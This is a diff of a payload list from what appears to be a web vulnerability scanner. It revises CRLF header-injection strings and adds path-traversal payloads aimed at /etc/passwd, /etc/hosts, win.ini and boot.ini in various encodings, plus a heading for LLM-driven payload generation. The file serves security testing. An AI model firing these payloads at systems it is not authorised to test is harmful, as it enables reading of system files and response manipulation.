@@ -140,24 +140,33 @@ ssti:
   - "${''class''}"
 
 header_injection:
-  - "\r\nX-Injected: wscan"
-  - "%0d%0aX-Injected: wscan"
-  - "%0aX-Injected: wscan"
-  - "\nX-Injected: wscan"
-  - "\r\nSet-Cookie: session=injected"
+  - "\r\nX-WscanHdrInject: 1"
+  - "%0d%0aX-WscanHdrInject:%201"
+  - "%0aX-WscanHdrInject:%201"
+  - "\nX-WscanHdrInject: 1"
+  - "%0d%0a X-WscanHdrInject:%201"
+  - "\r\nSet-Cookie: wscan_session=injected; Path=/"
 
 path_traversal:
+  # Unix — /etc/passwd
   - "../../../etc/passwd"
   - "../../etc/passwd"
   - "../etc/passwd"
   - "..%2F..%2F..%2Fetc%2Fpasswd"
   - "..%2f..%2f..%2fetc%2fpasswd"
   - "....//....//....//etc//passwd"
-  - "..\\..\\..\\windows\\win.ini"
-  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
   - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   - "%252e%252e%252fetc%252fpasswd"
   - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  # Unix — /etc/hosts
+  - "../../../etc/hosts"
+  - "..%2F..%2F..%2Fetc%2Fhosts"
+  # Windows
+  - "..\\..\\..\\windows\\win.ini"
+  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
+  - "..%5c..%5c..%5cwindows%5cwin.ini"
+  - "../../../../boot.ini"
+  - "..%2F..%2F..%2F..%2Fboot.ini"
 
 # LLM prompt templates for context-aware payload generation
 llm_prompts:
